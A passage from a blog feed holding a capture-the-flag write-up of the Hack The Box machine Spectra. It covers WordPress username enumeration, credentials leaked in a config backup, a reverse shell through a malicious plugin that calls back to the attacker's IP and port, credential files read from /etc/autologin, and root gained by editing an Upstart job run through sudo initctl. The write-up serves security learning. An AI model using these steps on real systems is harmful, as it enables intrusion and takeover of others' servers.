&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/5.png&#34; alt=&#34;Pasted image 20210623155726.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Some instant information we can gather is that this is a Wordpress site and that &lt;strong&gt;administrator&lt;/strong&gt; is a username we can later user in case we want to get access to it. By clicking on the &lt;strong&gt;Log in&lt;/strong&gt; link (bottom right), we get to the Wordpress login page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/6.png&#34; alt=&#34;Pasted image 20210623160559.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;There is something interesting to note here, which is a common bad practice on login pages, giving attackers the ability to validate if a username exists or not. We can see for example that trying to login with the username &lt;strong&gt;doomdesire&lt;/strong&gt; and a random password i get the following error:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/7.png&#34; alt=&#34;Pasted image 20210623161022.png&#34;&gt;
However, trying to login as &lt;strong&gt;administrator&lt;/strong&gt; and a random password i get the following error:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/8.png&#34; alt=&#34;Pasted image 20210623161152.png&#34;&gt;
which is clearly a different message from the previous one, confirming that &lt;strong&gt;administrator&lt;/strong&gt; is a valid name. Login pages should always have a consistent error message whether someone enters a valid username or not.
At this point there were some things we could try in order to maybe login such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Since this is a wordpress site, it&amp;rsquo;s a very good idea to run &lt;strong&gt;wpscan&lt;/strong&gt; which is a wordpress enumeration tool found here: &lt;a href=&#34;https://github.com/wpscanteam/wpscan&#34;&gt;https://github.com/wpscanteam/wpscan&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Since we have a valid username we could also brute force the login page trying out multiple passwords (in general this could potentially lock out a user or/and blacklist our IP so always use with caution).&lt;/li&gt;
&lt;li&gt;We could use CeWL (&lt;a href=&#34;https://github.com/digininja/CeWL&#34;&gt;https://github.com/digininja/CeWL&lt;/a&gt;) to build a password list based on the words used on the site in order to use them for a more targeted password attack (again, be careful about lockouts/blacklists).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These are all great things to have in mind in general, however there was no success, making the wordpress site a dead end for the time being.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;second-link-test&#34;&gt;Second Link (Test)&lt;/h3&gt;
&lt;p&gt;Apart from the &lt;strong&gt;Software Issue Tracker&lt;/strong&gt; link, there was also a &lt;strong&gt;Test&lt;/strong&gt; link on the initial page, that redirects us to &lt;a href=&#34;http://spectra.htb/testing/index.php&#34;&gt;http://spectra.htb/testing/index.php&lt;/a&gt; that returns us an &lt;strong&gt;Error establishing a database connection&lt;/strong&gt; message. However, index.php is not the only file hosted on &lt;strong&gt;/testing&lt;/strong&gt;, something that can be easily confirmed by visiting &lt;a href=&#34;http://spectra.htb/testing/&#34;&gt;http://spectra.htb/testing/&lt;/a&gt; :
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/9.png&#34; alt=&#34;Pasted image 20210623162742.png&#34;&gt;
There are multiple .php files listed in this page. In general, you want to look at everything to ensure you did not miss something, however any file containing the words &amp;ldquo;&lt;strong&gt;config&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;&lt;strong&gt;login&lt;/strong&gt;&amp;rdquo; should be the first to read. Checking the &lt;strong&gt;wp-config.php.save&lt;/strong&gt; file from our browser, it seems to be empty, however by viewing the page source we see a lot of comments:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/SQL.png&#34; alt=&#34;Pasted image 20210623163534.png&#34;&gt;
including &lt;strong&gt;MySQL&lt;/strong&gt; credentials!
Note that Instead of viewing the page source we could also use &lt;code&gt;curl http://spectra.htb/testing/wp-config.php.save&lt;/code&gt; from our terminal and we would also be able to view it.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;accessing-the-wordpress-administrator-panel&#34;&gt;Accessing the Wordpress Administrator Panel&lt;/h3&gt;
&lt;p&gt;We now have a password and including the newly found username &lt;strong&gt;devtest&lt;/strong&gt; we have 2 usernames we can try on the Wordpress login page we could not access earlier. Trying with the &lt;strong&gt;devstest&lt;/strong&gt; username brings no results, however, trying with the &lt;strong&gt;administrator&lt;/strong&gt; username get&amp;rsquo;s us right in:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/11.png&#34; alt=&#34;Pasted image 20210624164217.png&#34;&gt;
Some instant information we can get is that Wordpress is out-of-date and that our version is &lt;strong&gt;5.4.2&lt;/strong&gt;. Of course we could have known this right from the start by looking for example at the page source of the login page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/12.png&#34; alt=&#34;Pasted image 20210624163938.png&#34;&gt;
or by using the firefox extension &amp;ldquo;&lt;strong&gt;Wappalyzer&lt;/strong&gt;&amp;rdquo;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/13.png&#34; alt=&#34;Pasted image 20210624164029.png&#34;&gt;
The version can also be found by the previously mentioned &lt;strong&gt;wpscan&lt;/strong&gt; tool.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;getting-a-shell-as-nginx&#34;&gt;Getting a shell as nginx&lt;/h3&gt;
&lt;p&gt;Since we are on the Wordpress adminitration panel, there are some ways we can get a reverse shell. The method we are gonna use here is uploading a malicious plugin. There is a cool script we can use for this, that can be found here: &lt;a href=&#34;https://github.com/wetw0rk/malicious-wordpress-plugin&#34;&gt;https://github.com/wetw0rk/malicious-wordpress-plugin&lt;/a&gt;.
It&amp;rsquo;s usage is pretty straightforward. We are gonna run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x wordpwn.py
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./wordpwn.py 10.10.14.9 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; Y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will first make the script executable, then create file called &amp;ldquo;&lt;strong&gt;malicious.zip&lt;/strong&gt;&amp;rdquo; that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The &lt;code&gt;Y&lt;/code&gt; option declares that we want to automatically start a handler with metasploit:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/15.png&#34; alt=&#34;Pasted image 20210624170131.png&#34;&gt;
As our handler is waiting to receive a connection, we upload our malicious plugin by navigating to &lt;code&gt;Plugins--&amp;gt;Add New--&amp;gt;Upload Plugin--&amp;gt;Browse&lt;/code&gt; and select the &lt;strong&gt;malicious.zip&lt;/strong&gt; file we generated with the script. We then select &lt;code&gt;Install Now&lt;/code&gt; and then &lt;code&gt;Activate Plugin&lt;/code&gt;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/16.png&#34; alt=&#34;Pasted image 20210624170543.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;As stated in the script github page, once the plugin is installed and activated, we just have to navigate to the following URLs to launch the reverse shell (we have to add the &lt;code&gt;/main&lt;/code&gt; part in the URL, which we can observe if we look the URL paths used by our target server. Not including this path will not work, since the 2 files we want to request will not be found):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php&#34;&gt;http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php&#34;&gt;http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;and we get a reverse shell:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/17.png&#34; alt=&#34;Pasted image 20210624170913.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;escalating-privileges-to-katie&#34;&gt;Escalating Privileges to Katie&lt;/h3&gt;
&lt;p&gt;At first glance we can see there is another user on the box named Katie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/passwd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/18.png&#34; alt=&#34;Pasted image 20210624171438.png&#34;&gt;
If we want to get the &lt;strong&gt;user.txt&lt;/strong&gt; we have to escalate our privileges to that user. If we are going to avoid automated tools such as &lt;strong&gt;LinPeas&lt;/strong&gt;, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -name *.conf* 2&amp;gt; /dev/null
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will search for all files on the system that contain the &lt;strong&gt;.conf&lt;/strong&gt; part on their name. However running this will create a lot of noise from some folders such as &lt;strong&gt;/etc&lt;/strong&gt;, &lt;strong&gt;/mnt&lt;/strong&gt; and &lt;strong&gt;/usr&lt;/strong&gt; so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too.  To filter them out we run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -name *.conf* 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/etc/&amp;#34;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/mnt/&amp;#34;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/20.png&#34; alt=&#34;Pasted image 20210624172845.png&#34;&gt;
We notice a file named &lt;strong&gt;/opt/autologin.conf.orig&lt;/strong&gt;. Reading it, we see there is a password file on a folder named &lt;strong&gt;autologin&lt;/strong&gt; inside &lt;strong&gt;/etc&lt;/strong&gt;. Remember that we filtered out this folder! We could have easily missed it!
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/21.png&#34; alt=&#34;Pasted image 20210624173246.png&#34;&gt;
Reading the &lt;strong&gt;passwd&lt;/strong&gt; file inside &lt;strong&gt;/etc/autologin/&lt;/strong&gt; we get a password:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/22.png&#34; alt=&#34;Pasted image 20210624173626.png&#34;&gt;
The possible users to try logging in with this password are root and Katie. There was no success with root, however with Katie the credentials are valid and we can now login as her via ssh!
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/23.png&#34; alt=&#34;Pasted image 20210624173903.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h3&gt;
&lt;p&gt;Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as &lt;strong&gt;LinPeas&lt;/strong&gt;, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo -l
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will list all the binaries Katie can run with sudo:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/24.png&#34; alt=&#34;Pasted image 20210624174625.png&#34;&gt;
We see that we can run &lt;strong&gt;initctl&lt;/strong&gt; as root. As stated on it&amp;rsquo;s man page, initctl allows a system administrator to communicate and interact with the &lt;strong&gt;Upstart&lt;/strong&gt;. Upstart handles the starting of the tasks and services during boot and stopping them during shutdown. By interacting with the Upstart, we can make initctl start or stop jobs. The way initctl understands what jobs it can work with is by reading the configuration files of them, found on the /etc/init folder. So if we manage to make our own job, we can start it and it will run as the root user since we have sudo rights. So we have 2 options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Create a new job by writing a new configuration file (.conf).&lt;/li&gt;
&lt;li&gt;Edit an already existing one.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first option is not possible since we do not have permission to write on the /etc folder. That leaves us with the second option. By searching through the /etc/init folder we see that we can&amp;rsquo;t edit all files, however we have the rights to edit some of the files in there. Great!
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/25.png&#34; alt=&#34;Pasted image 20210624180211.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Below we can see what a job configuration file looks like:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/26.png&#34; alt=&#34;Pasted image 20210624180517.png&#34;&gt;
Notice the part between &amp;ldquo;&lt;strong&gt;script&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;&lt;strong&gt;end script&lt;/strong&gt;&amp;rdquo;. That part contains the commands that are gonna run when the job starts. What we want to do is replace these commands with our own. There are some choices here, so let&amp;rsquo;s try making the job set the SUID permission on /bin/bash. This will let us run bin/bash with root privileges. In this example, i edit the &lt;code&gt;test.conf&lt;/code&gt; file with &lt;code&gt;nano&lt;/code&gt;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/28.png&#34; alt=&#34;Pasted image 20210624182236.png&#34;&gt;
Once we edit the job configuration file we need to start it with initctl (with sudo). After we start it, the job will execute &lt;code&gt;sudo +s /bin/bash&lt;/code&gt; as the root user.  We can confirm it worked by executing &lt;code&gt;/bin/bash&lt;/code&gt; with the &lt;code&gt;-p&lt;/code&gt; flag. The &lt;code&gt;-p&lt;/code&gt; flag is required in order for this to work since it is used to turn on privileged mode, making the bash shell run with the SUID privileges we set with the job:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/29.png&#34; alt=&#34;Pasted image 20210624182515.png&#34;&gt;
We are root!&lt;/p&gt;
&lt;h1 id=&#34;resources&#34;&gt;Resources&lt;/h1&gt;
&lt;p&gt;A good place to learn about &lt;strong&gt;Upstart&lt;/strong&gt; and &lt;strong&gt;initctl&lt;/strong&gt;:
&lt;a href=&#34;https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it&#34;&gt;https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;
</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
                        
                    
                
            
            
            
                
                    
                
                    
                
            
        </entry>
    
</feed>
